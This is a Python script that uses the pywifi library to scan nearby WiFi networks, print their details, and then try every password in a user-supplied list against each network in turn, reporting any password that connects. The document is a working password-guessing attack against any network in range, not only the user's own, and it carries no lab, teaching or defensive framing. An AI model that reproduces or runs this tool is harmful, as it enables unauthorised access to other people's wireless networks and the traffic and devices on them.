import time
import pywifi
from pywifi import const

def scan_and_connect(password_list):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    # Scan for available WiFi networks
    iface.scan()
    time.sleep(1)

    # Get scan results
    scan_results = iface.scan_results()

    print("Scan Results:")
    for network in scan_results:
        print(f"SSID: {network.ssid}")
        print(f"BSSID: {network.bssid}")
        print(f"Signal Strength: {network.signal}")
        print(f"Encryption Type: {get_encryption_type(network)}")
        print("="*20)

    for network in scan_results:
        ssid = network.ssid
        print(f"Trying to connect to network: {ssid}")

        # Connect to the target network
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP

        for password in password_list:
            profile.key = password

            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(profile)

            iface.connect(tmp_profile)

            # Wait for connection status
            timekeeper = 0
            while iface.status() != const.IFACE_CONNECTED:
                time.sleep(1)
                timekeeper += 1
                if(timekeeper == 3):
                    print("Took more than " + str(timekeeper) + " to connect. Moving to next item.")
                    break

            if iface.status() == const.IFACE_CONNECTED:
                print(f"Successfully connected to {ssid} with password: {password}")
                return True
            else:
                print(f"Not able to connect to {ssid} with password: {password}")

    print("Could not connect to any of the networks with the provided passwords.")
    return False

def get_encryption_type(network):
    if network.akm[0] == const.AKM_TYPE_NONE:
        return "None"
    elif network.akm[0] == const.AKM_TYPE_WPA:
        return "WPA"
    elif network.akm[0] == const.AKM_TYPE_WPAPSK:
        return "WPA-PSK"
    elif network.akm[0] == const.AKM_TYPE_WPA2:
        return "WPA2"
    elif network.akm[0] == const.AKM_TYPE_WPA2PSK:
        return "WPA2-PSK"
    else:
        return "Unknown"

if __name__ == "__main__":
    password_list = input("Enter a list of passwords separated by spaces: ").split()
    scan_and_connect(password_list)
